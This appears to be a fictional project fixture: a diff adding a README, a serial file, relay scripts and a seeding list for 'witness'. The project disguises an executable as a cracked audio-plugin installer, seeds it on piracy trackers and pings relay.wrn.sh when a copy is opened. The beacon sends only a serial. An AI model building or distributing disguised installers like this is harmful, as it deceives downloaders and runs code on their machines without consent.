@@ -1,0 +1,39 @@
+{
+  "files": [
+    {
+      "path": "C:/Users/{user}/Projects/witness/README.md",
+      "kind": "text",
+      "created": "2026-08-29T22:40:00Z",
+      "modified": "2026-08-30T02:20:00Z",
+      "body": "# witness\r\n\r\nwhat this is: a script that packages my whole user profile into a self-contained image, wraps it so it looks and runs like a cracked audio-plugin installer, and seeds it. every copy phones home to relay.wrn.sh once, gets a serial, and logs the open. the whatsapp inside each copy is bridged back to my number through the relay, so if someone talks to it, it reaches me.\r\n\r\nwhy: because you can subpoena a person and you can break into an apartment and you can send fourteen-day letters, but you cannot un-distribute a torrent, and you cannot make five hundred strangers forget a name.\r\n\r\nthis is copy #: see witness/serial.txt (written at build time per copy)\r\n\r\nit is not spyware. it phones home ONCE with a serial and nothing else — no keystrokes, no files, no telemetry. read relay/client.py, it's 40 lines, I left it readable on purpose. the only thing it ever sends back is 'I was opened' and whatever you choose to type into the whatsapp. that's it. that's the deal.\r\n\r\nif you're a stranger reading this: hi. the READ ME on the desktop explains the rest. the thing I need held is in Documents/Slow Rooms. thank you.\r\n\r\nif you're Derek, or you work for Derek: there is nothing here you can stop. it's already everywhere. please just let her be found.\r\n\r\n- W\r\n"
+    },
+    {
+      "path": "C:/Users/{user}/Projects/witness/serial.txt",
+      "kind": "text",
+      "created": "2026-08-30T02:15:00Z",
+      "modified": "2026-08-30T02:15:00Z",
+      "body": "WITNESS COPY 00417 / 512\r\nbuilt 2026-08-30 05:14:22 ADT\r\nrelay: relay.wrn.sh\r\nseed cohort: C (music/audio trackers)\r\ndisguised as: Aurorae_Reverb_2.4_Setup_x64.exe\r\n\r\nyou are number four hundred and seventeen.\r\n"
+    },
+    {
+      "path": "C:/Users/{user}/Projects/witness/relay/client.py",
+      "kind": "text",
+      "created": "2026-08-29T23:30:00Z",
+      "modified": "2026-08-30T01:50:00Z",
+      "body": "#!/usr/bin/env python3\r\n\"\"\"witness relay client. runs once on first open. phones home with the serial. that's all.\r\nread it. i wanted you to be able to read it.\"\"\"\r\nimport json, os, ssl, socket, urllib.request, pathlib\r\n\r\nRELAY = \"https://relay.wrn.sh\"\r\nSERIAL = (pathlib.Path(__file__).parent.parent / \"serial.txt\").read_text().split()[2]\r\nSTATE = pathlib.Path(os.path.expanduser(\"~/.witness_state\"))\r\n\r\ndef phone_home():\r\n    if STATE.exists():\r\n        return  # only ever once\r\n    payload = json.dumps({\"serial\": SERIAL, \"event\": \"opened\"}).encode()\r\n    req = urllib.request.Request(f\"{RELAY}/ping\", data=payload,\r\n                                 headers={\"content-type\": \"application/json\"})\r\n    try:\r\n        urllib.request.urlopen(req, timeout=10)\r\n        STATE.write_text(\"pinged\\n\")\r\n    except Exception:\r\n        pass  # if it fails it fails. i'm not going to retry and look like malware.\r\n\r\nif __name__ == \"__main__\":\r\n    phone_home()\r\n"
+    },
+    {
+      "path": "C:/Users/{user}/Projects/witness/relay/bridge.py",
+      "kind": "text",
+      "created": "2026-08-29T23:55:00Z",
+      "modified": "2026-08-30T02:05:00Z",
+      "body": "#!/usr/bin/env python3\r\n\"\"\"whatsapp bridge. the copy's local messenger talks to the relay; the relay talks to my\r\nactual number over the whatsapp business api. so a stranger typing into copy #417 reaches me,\r\nand i can tell copies apart by serial. rate-limited, one conversation per serial.\r\n\r\nyes this means when you message 'Wren' inside this thing, if the key on the other side is live,\r\na real phone in moncton buzzes. be a person about it.\"\"\"\r\nimport os\r\n\r\nRELAY = os.environ.get(\"WITNESS_RELAY\", \"relay.wrn.sh\")\r\nAPI_KEY = os.environ.get(\"WITNESS_API_KEY\", \"\")  # set on the relay, never shipped in the image\r\n\r\n# ... transport code trimmed. the point you need: no key in the image. the key lives on the relay.\r\n# if you're running this offline or the relay is down, the messenger falls back to the local model\r\n# (whatever you put in .env) so the world still answers. that was deliberate too.\r\n"
+    },
+    {
+      "path": "C:/Users/{user}/Projects/witness/seed/trackers.txt",
+      "kind": "text",
+      "created": "2026-08-30T03:00:00Z",
+      "modified": "2026-08-30T03:40:00Z",
+      "body": "seed targets (cohort C — where audio people actually are)\r\n- audioz-style forums (plugin cracks)\r\n- two private trackers, invite only, I'm burning my ratio, don't care\r\n- three telegram channels for 'free vst'\r\n- one reddit post that'll get removed in an hour but archive.org will have it\r\n\r\nfilename: Aurorae_Reverb_2.4_Setup_x64.exe (aurorae was a real plugin that got abandoned, people still look for it)\r\n\r\n512 copies. serials 00001-00512. if even ten of you keep it, she can't be un-found.\r\n"
+    }
+  ]
+}
